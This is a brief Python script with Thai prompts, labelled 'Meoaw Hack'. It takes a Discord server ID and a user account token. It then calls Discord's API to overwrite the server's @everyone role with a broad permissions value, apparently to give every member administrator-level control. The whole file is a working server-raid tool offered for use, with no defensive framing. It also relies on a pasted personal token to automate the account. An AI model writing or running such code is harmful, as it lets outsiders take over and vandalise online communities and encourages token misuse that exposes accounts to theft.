import requests
import platform
import os

def main():
    guilds = input("กรุณาใส่ไอดีเซิฟเวอร์ Discord: ")  # รับค่า guild ID จากผู้ใช้
    token = input("กรุณาใส่โทเคน Discord ของคุณ: ")  # รับค่าโทเคนจากผู้ใช้

    if platform.system() == 'Windows':
        os.system('cls & title Meoaw Hack ( Admin )')
        print(" ")
        print("Start Hack !")
        print(" ")
        hack(guilds, token)
    else:
        os.system('clear')
        print(" ")
        print("Start Hack !")
        print(" ")
        hack(guilds, token)

def hack(guilds, token):
    meoaw = requests.session()

    header = {
        'authorization': token
    }

    auth = meoaw.patch(f"https://discord.com/api/v9/guilds/{guilds}/roles/{guilds}", headers=header, json={"name":"@everyone","permissions":"1071698660937"})

    if auth.status_code == 200:
        print(" ")
        print("Hack Done !")
        print(" ")
    else:
        print(" ")
        print("Hack Fail :(")
        print(" ")
        print(f"Status: {auth.status_code}")
        print(" ")

main()

# Code by Meoaw | discord.gg/meoaw | อัพเดทล่าสุด 27/4/66 6:29